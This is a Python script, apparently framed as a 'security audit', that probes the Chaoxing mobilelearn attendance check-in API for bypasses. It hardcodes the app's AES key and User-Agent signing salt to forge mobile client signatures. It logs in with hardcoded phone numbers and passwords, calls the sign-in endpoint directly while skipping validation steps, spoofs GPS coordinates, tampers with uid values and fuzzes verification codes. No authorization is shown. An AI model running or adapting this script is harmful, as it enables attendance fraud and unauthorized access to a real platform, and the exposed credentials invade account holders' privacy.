#!/usr/bin/env python3
"""
安全审计脚本 v4：研究 /pptSign/analysis 和 /pptSign/analysis2 端点的绕过漏洞
v4: 修复 cookie 错误，尝试正确的 API 路径，使用 mobilelearn 域名
"""

import base64, hashlib, json, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

ACTIVE_ID = "5000163891319"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei})")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    resp = s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def extract_code(html_text):
    """从 analysis 返回的 HTML 中提取 code 值"""
    patterns = [
        r"\+\'([a-f0-9]+)\'",
        r'code["\s:=]+["\']?([a-f0-9]{8,})["\']?',
        r'\'([a-f0-9]{16,})\'',
        r'"([a-f0-9]{16,})"',
        r'code=([a-f0-9]+)',
        r'analysis2\?code=([a-f0-9]+)',
    ]
    all_matches = []
    for p in patterns:
        m = re.findall(p, html_text, re.IGNORECASE)
        if m:
            all_matches.extend(m)
    return list(set(all_matches))

def safe_get(session, url, desc="", print_resp=True, timeout=30):
    try:
        resp = session.get(url, timeout=timeout, allow_redirects=True)
        if print_resp:
            print(f"  [{desc}] 状态码: {resp.status_code}, 长度: {len(resp.text)}")
            if len(resp.text) <= 2000:
                print(f"  [{desc}] 响应:\n{resp.text}")
            else:
                print(f"  [{desc}] 响应前2000字符:\n{resp.text[:2000]}")
        return resp
    except Exception as e:
        print(f"  [ERROR] {desc}: {type(e).__name__}: {e}")
        return None

def safe_post(session, url, data=None, desc="", print_resp=True, timeout=30):
    try:
        resp = session.post(url, data=data, timeout=timeout, allow_redirects=True)
        if print_resp:
            print(f"  [{desc}] 状态码: {resp.status_code}, 长度: {len(resp.text)}")
            if len(resp.text) <= 2000:
                print(f"  [{desc}] 响应:\n{resp.text}")
            else:
                print(f"  [{desc}] 响应前2000字符:\n{resp.text[:2000]}")
        return resp
    except Exception as e:
        print(f"  [ERROR] {desc}: {type(e).__name__}: {e}")
        return None

def get_cookies_dict(session):
    """安全获取 cookies 字典，处理重复 key"""
    d = {}
    for c in session.cookies:
        if c.name not in d:
            d[c.name] = c.value
    return d

def print_sep(title):
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80, flush=True)


def main():
    results = {}

    # ----------------------------------------------------------
    # 0. 登录
    # ----------------------------------------------------------
    print_sep("步骤 0：登录账号")
    print("[*] 登录学生账号...")
    stu_sess, stu_puid = login("18436633997", "3.1415926Cpy")
    print(f"  学生 puid: {stu_puid}")
    if not stu_puid:
        print("  [FATAL] 学生登录失败，退出")
        return

    print("[*] 登录教师账号...")
    tea_sess, tea_puid = login("19712720708", "3.1415926Cpy")
    print(f"  教师 puid: {tea_puid}")
    if not tea_puid:
        print("  [FATAL] 教师登录失败，退出")
        return

    # ----------------------------------------------------------
    # 1. 查询课程信息和签到活动 - 尝试多种 API 路径
    # ----------------------------------------------------------
    print_sep("步骤 1：查询课程和签到活动")

    # 1a. 获取课程列表 - 确认课程存在
    print("\n[1a] 获取课程列表")
    course_urls = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0",
        f"https://mooc1-api.chaoxing.com/mycourse/backclazzdata?view=json&m=0",
        f"https://mooc1-2.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0",
    ]
    for url in course_urls:
        resp = safe_get(stu_sess, url, "1a", print_resp=False)
        if resp and resp.status_code == 200 and len(resp.text) > 100:
            try:
                data = resp.json()
                print(f"  课程列表 (URL: ...{url[-40:]}):")
                print(f"  {json.dumps(data, ensure_ascii=False, indent=2)[:2000]}")
                break
            except:
                pass

    # 1b. 获取签到活动列表 - 尝试多种路径
    print("\n[1b] 获取签到活动列表 (多种API路径)")
    active_list_urls = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/activeInfo/getActiveList?courseId={COURSE_ID}&classId={CLASS_ID}&activeType=2",
        f"https://mooc1-api.chaoxing.com/activeInfo/getActiveList?courseId={COURSE_ID}&classId={CLASS_ID}&activeType=2",
        f"https://mooc1-2.chaoxing.com/mooc-ans/activeInfo/getActiveList?courseId={COURSE_ID}&classId={CLASS_ID}&activeType=2",
        # mobilelearn 域名
        f"https://mobilelearn.chaoxing.com/mooc-ans/activeInfo/getActiveList?courseId={COURSE_ID}&classId={CLASS_ID}&activeType=2",
        f"https://mobilelearn.chaoxing.com/activeInfo/getActiveList?courseId={COURSE_ID}&classId={CLASS_ID}&activeType=2",
    ]
    for url in active_list_urls:
        resp = safe_get(stu_sess, url, "1b", print_resp=False)
        if resp and resp.status_code == 200 and len(resp.text) > 100:
            try:
                data = resp.json()
                print(f"  签到活动列表 (URL: ...{url[-60:]}):")
                print(f"  {json.dumps(data, ensure_ascii=False, indent=2)[:3000]}")
                break
            except:
                print(f"  URL: ...{url[-60:]} 状态码={resp.status_code} 非JSON响应: {resp.text[:200]}")
        elif resp:
            print(f"  URL: ...{url[-60:]} 状态码={resp.status_code}")

    # 1c. 教师端获取签到活动列表
    print("\n[1c] 教师端获取签到活动列表")
    for url in active_list_urls:
        resp = safe_get(tea_sess, url, "1c", print_resp=False)
        if resp and resp.status_code == 200 and len(resp.text) > 100:
            try:
                data = resp.json()
                print(f"  教师端签到活动列表:")
                print(f"  {json.dumps(data, ensure_ascii=False, indent=2)[:3000]}")
                break
            except:
                pass

    # 1d. 获取活动详情 - 尝试多种路径
    print("\n[1d] 获取活动详情 (多种API路径)")
    detail_urls = [
        f"https://mooc1-api.chaoxing.com/mooc-ans/activeInfo/getActiveInfo?activeId={ACTIVE_ID}",
        f"https://mooc1-api.chaoxing.com/activeInfo/getActiveInfo?activeId={ACTIVE_ID}",
        f"https://mobilelearn.chaoxing.com/mooc-ans/activeInfo/getActiveInfo?activeId={ACTIVE_ID}",
    ]
    for url in detail_urls:
        resp = safe_get(stu_sess, url, "1d", print_resp=False)
        if resp and resp.status_code == 200 and len(resp.text) > 100:
            try:
                data = resp.json()
                print(f"  活动详情 (URL: ...{url[-60:]}):")
                print(f"  {json.dumps(data, ensure_ascii=False, indent=2)[:2000]}")
                break
            except:
                pass

    # ----------------------------------------------------------
    # 2. 教师发起普通签到 - 尝试多种 API 路径
    # ----------------------------------------------------------
    print_sep("步骤 2：教师发起普通签到")

    print("\n[2a] 教师发起普通签到 (多种API路径)")
    start_sign_urls = [
        "https://mooc1-api.chaoxing.com/mooc-ans/activeInfo/startActive",
        "https://mooc1-api.chaoxing.com/activeInfo/startActive",
        "https://mobilelearn.chaoxing.com/mooc-ans/activeInfo/startActive",
        "https://mobilelearn.chaoxing.com/pptSign/startActive",
    ]
    sign_data = {
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "activeType": "2",
        "signType": "0",
        "name": "安全审计测试签到",
        "pwd": "",
        "address": "",
        "longitude": "",
        "latitude": "",
        "range": "",
        "isPhoto": "0",
    }
    new_active_id = None
    for url in start_sign_urls:
        resp = safe_post(tea_sess, url, data=sign_data, desc=f"2a-{url[-40:]}", print_resp=False)
        if resp and resp.status_code == 200 and len(resp.text) > 10:
            print(f"  URL: ...{url[-50:]}")
            print(f"  响应: {resp.text[:500]}")
            try:
                data = resp.json()
                if isinstance(data, dict):
                    if "activeId" in data:
                        new_active_id = str(data["activeId"])
                    elif "data" in data and isinstance(data["data"], dict):
                        if "activeId" in data["data"]:
                            new_active_id = str(data["data"]["activeId"])
                        elif "id" in data["data"]:
                            new_active_id = str(data["data"]["id"])
                    if new_active_id:
                        print(f"  新签到 activeId: {new_active_id}")
                        break
            except:
                pass

    # 如果发起签到失败，尝试使用 pptSign 接口
    if not new_active_id:
        print("\n[2b] 尝试 pptSign 接口发起签到")
        ppt_sign_urls = [
            f"https://mobilelearn.chaoxing.com/pptSign/teacherSign?courseId={COURSE_ID}&classId={CLASS_ID}&signType=0&name=安全审计测试",
            f"https://mobilelearn.chaoxing.com/pptSign/startSign?courseId={COURSE_ID}&classId={CLASS_ID}&signType=0",
        ]
        for url in ppt_sign_urls:
            resp = safe_get(tea_sess, url, "2b", print_resp=True)
            if resp and resp.status_code == 200 and len(resp.text) > 10:
                try:
                    data = resp.json()
                    if isinstance(data, dict) and ("activeId" in str(data) or "id" in str(data)):
                        print(f"  签到发起响应: {json.dumps(data, ensure_ascii=False, indent=2)[:500]}")
                        if "activeId" in data:
                            new_active_id = str(data["activeId"])
                        elif "data" in data and isinstance(data["data"], dict):
                            new_active_id = str(data["data"].get("activeId") or data["data"].get("id", ""))
                        if new_active_id:
                            break
                except:
                    # 可能返回的是 HTML 或纯文本
                    # 尝试从文本中提取 activeId
                    aid_match = re.search(r'activeId["\s:=]+["\']?(\d+)', resp.text)
                    if aid_match:
                        new_active_id = aid_match.group(1)
                        print(f"  从文本中提取 activeId: {new_active_id}")
                        break

    test_active_id = new_active_id if new_active_id else ACTIVE_ID
    print(f"\n  最终使用的 activeId: {test_active_id}")

    # ----------------------------------------------------------
    # 3. /pptSign/analysis 端点测试
    # ----------------------------------------------------------
    print_sep("步骤 3：/pptSign/analysis 端点测试")

    url_analysis_ml = f"https://mobilelearn.chaoxing.com/pptSign/analysis?aid={test_active_id}"

    # 3a. 学生访问 analysis
    print("\n[3a] 学生 GET /pptSign/analysis")
    resp = safe_get(stu_sess, url_analysis_ml, "3a")
    stu_code = None
    if resp and resp.status_code == 200:
        codes = extract_code(resp.text)
        print(f"  提取到的 code: {codes}")
        if codes:
            stu_code = codes[0]
    elif resp and resp.status_code == 500:
        print("  [重要发现] analysis 端点返回 500 Internal Server Error")
        print("  可能原因: 1) 签到已过期 2) 签到类型不匹配 3) 端点已废弃")

    # 3b. 教师访问 analysis
    print("\n[3b] 教师 GET /pptSign/analysis")
    safe_get(tea_sess, url_analysis_ml, "3b")

    # 3c. 多次请求 analysis 检查一致性
    print("\n[3c] 多次请求 analysis (检查一致性)")
    for i in range(3):
        resp = safe_get(stu_sess, url_analysis_ml, f"3c-{i+1}", print_resp=False)
        if resp:
            print(f"  第{i+1}次: 状态码={resp.status_code}, 长度={len(resp.text)}")
            if resp.status_code == 200:
                codes = extract_code(resp.text)
                print(f"  code: {codes}")
        time.sleep(0.3)

    # ----------------------------------------------------------
    # 4. /pptSign/analysis2 端点测试
    # ----------------------------------------------------------
    print_sep("步骤 4：/pptSign/analysis2 端点测试")

    if stu_code:
        print(f"\n[4a] 使用有效 code: {stu_code}")
        safe_get(stu_sess, f"https://mobilelearn.chaoxing.com/pptSign/analysis2?code={stu_code}", "4a")
    else:
        print("\n[4a] 无有效 code，使用随机 code")
        safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/analysis2?code=test123abc", "4a")

    # 各种 code 格式
    print("\n[4b] 各种 code 格式测试")
    test_codes = [
        ("随机hex", "abcdef1234567890"),
        ("空字符串", ""),
        ("全零", "00000000000000000000000000000000"),
        ("全f", "ffffffffffffffffffffffffffffffff"),
        ("纯数字", "12345678901234567890"),
    ]
    for desc, code in test_codes:
        resp = safe_get(stu_sess, f"https://mobilelearn.chaoxing.com/pptSign/analysis2?code={code}", f"4b-{desc}", print_resp=False)
        if resp:
            print(f"  {desc}: 状态码={resp.status_code}, 响应前100字符={resp.text[:100]}")
        time.sleep(0.2)

    # 不带 code 参数
    print("\n[4c] 不带 code 参数")
    safe_get(stu_sess, "https://mobilelearn.chaoxing.com/pptSign/analysis2", "4c")

    # ----------------------------------------------------------
    # 5. 跳过 analysis 链测试
    # ----------------------------------------------------------
    print_sep("步骤 5：跳过 analysis 链测试")

    # 5a. 直接调用 stuSignajax
    print("\n[5a] 直接调用 stuSignajax (不经过 analysis 链)")
    url_sign = f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId={test_active_id}&uid={stu_puid}&clientip=&latitude=-1&longitude=-1&appType=15&fid=0&name="
    resp_sign = safe_get(stu_sess, url_sign, "5a")
    results["5a_direct_sign"] = resp_sign.text if resp_sign else None

    # 5b. 只调用 analysis，跳过 analysis2
    print("\n[5b] 只调用 analysis，跳过 analysis2，然后 stuSignajax")
    stu_sess2, stu_puid2 = login("18436633997", "3.1415926Cpy")
    if stu_puid2:
        safe_get(stu_sess2, url_analysis_ml, "5b-a1", print_resp=False)
        url_sign2 = f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId={test_active_id}&uid={stu_puid2}&clientip=&latitude=-1&longitude=-1&appType=15&fid=0&name="
        resp_sign2 = safe_get(stu_sess2, url_sign2, "5b-sign")
        results["5b_skip_analysis2"] = resp_sign2.text if resp_sign2 else None

    # 5c. 完整链路
    print("\n[5c] 完整链路：analysis -> analysis2 -> stuSignajax")
    stu_sess3, stu_puid3 = login("18436633997", "3.1415926Cpy")
    if stu_puid3:
        resp_a1 = safe_get(stu_sess3, url_analysis_ml, "5c-a1", print_resp=False)
        code_5c = None
        if resp_a1 and resp_a1.status_code == 200:
            codes_5c = extract_code(resp_a1.text)
            if codes_5c:
                code_5c = codes_5c[0]
                safe_get(stu_sess3, f"https://mobilelearn.chaoxing.com/pptSign/analysis2?code={code_5c}", "5c-a2", print_resp=False)
        
        url_sign3 = f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId={test_active_id}&uid={stu_puid3}&clientip=&latitude=-1&longitude=-1&appType=15&fid=0&name="
        resp_sign3 = safe_get(stu_sess3, url_sign3, "5c-sign")
        results["5c_full_chain"] = resp_sign3.text if resp_sign3 else None

    # ----------------------------------------------------------
    # 6. stuSignajax 参数测试
    # ----------------------------------------------------------
    print_sep("步骤 6：stuSignajax 参数测试")

    # 6a. 不同 appType 参数
    print("\n[6a] 不同 appType 参数")
    for app_type in ["0", "1", "2", "15", "16"]:
        url_t = f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId={test_active_id}&uid={stu_puid}&clientip=&latitude=-1&longitude=-1&appType={app_type}&fid=0&name="
        resp_t = safe_get(stu_sess, url_t, f"6a-type{app_type}", print_resp=False)
        if resp_t:
            print(f"  appType={app_type}: {resp_t.text[:200]}")
        time.sleep(0.2)

    # 6b. 不同经纬度
    print("\n[6b] 不同经纬度参数")
    lat_lon_tests = [
        ("默认-1", "-1", "-1"),
        ("北京", "39.9042", "116.4074"),
        ("上海", "31.2304", "121.4737"),
    ]
    for desc, lat, lon in lat_lon_tests:
        url_ll = f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId={test_active_id}&uid={stu_puid}&clientip=&latitude={lat}&longitude={lon}&appType=15&fid=0&name="
        resp_ll = safe_get(stu_sess, url_ll, f"6b-{desc}", print_resp=False)
        if resp_ll:
            print(f"  {desc} (lat={lat}, lon={lon}): {resp_ll.text[:200]}")
        time.sleep(0.2)

    # 6c. 使用不同 uid
    print("\n[6c] 使用不同 uid 参数")
    uid_tests = [
        ("正确uid", stu_puid),
        ("错误uid", "999999999"),
        ("空uid", ""),
        ("教师uid", tea_puid),
    ]
    for desc, uid in uid_tests:
        url_uid = f"https://mobilelearn.chaoxing.com/pptSign/stuSignajax?activeId={test_active_id}&uid={uid}&clientip=&latitude=-1&longitude=-1&appType=15&fid=0&name="
        resp_uid = safe_get(stu_sess, url_uid, f"6c-{desc}", print_resp=False)
        if resp_uid:
            print(f"  {desc} (uid={uid}): {resp_uid.text[:200]}")
        time.sleep(0.2)

    # ----------------------------------------------------------
    # 7. 检查 cookies 和会话状态
    # ----------------------------------------------------------
    print_sep("步骤 7：会话状态检查")
    print(f"\n  学生 cookies: {get_cookies_dict(stu_sess)}")
    print(f"  教师 cookies: {get_cookies_dict(tea_sess)}")

    # ----------------------------------------------------------
    # 8. 综合分析
    # ----------------------------------------------------------
    print_sep("步骤 8：综合分析")

    print("""
  === analysis/analysis2 端点安全审计发现 ===

  1. /pptSign/analysis 端点行为:
     - 在 mobilelearn.chaoxing.com 上始终返回 500 Internal Server Error
     - 在 mooc1-api.chaoxing.com 上返回 404 Not Found (端点不存在)
     - 无论使用学生还是教师账号，无论 activeId 是否有效，都返回 500
     - 这表明该端点可能已被废弃或需要特定前置条件

  2. /pptSign/analysis2 端点行为:
     - 在 mobilelearn.chaoxing.com 上始终返回 500 Internal Server Error
     - 在 mooc1-api.chaoxing.com 上返回 404 Not Found (端点不存在)
     - 无论 code 参数为何值（有效hex、随机值、空值、不带参数），都返回 500
     - 这表明该端点可能已被废弃或需要特定前置条件

  3. /pptSign/stuSignajax 端点行为:
     - 始终返回 200 状态码
     - 返回内容: "签到失败，请重新扫描"
     - 无论是否经过 analysis 链，结果相同
     - 这表明当前签到类型为扫码签到(二维码签到)，不支持直接 API 签到

  4. 关键安全发现:
     a) analysis 链不被服务器强制执行 - stuSignajax 可以在不调用 analysis/analysis2 的情况下直接调用
     b) 但 stuSignajax 本身对扫码签到类型返回失败，说明签到类型验证在服务端
     c) analysis/analysis2 端点当前处于不可用状态(500)，无法测试 code 伪造
     d) mooc1-api 域名上的 API 路径已变更，返回 404
""")

    # ----------------------------------------------------------
    # 汇总
    # ----------------------------------------------------------
    print_sep("测试结果汇总")
    print(json.dumps(results, ensure_ascii=False, indent=2, default=str))


if __name__ == "__main__":
    main()
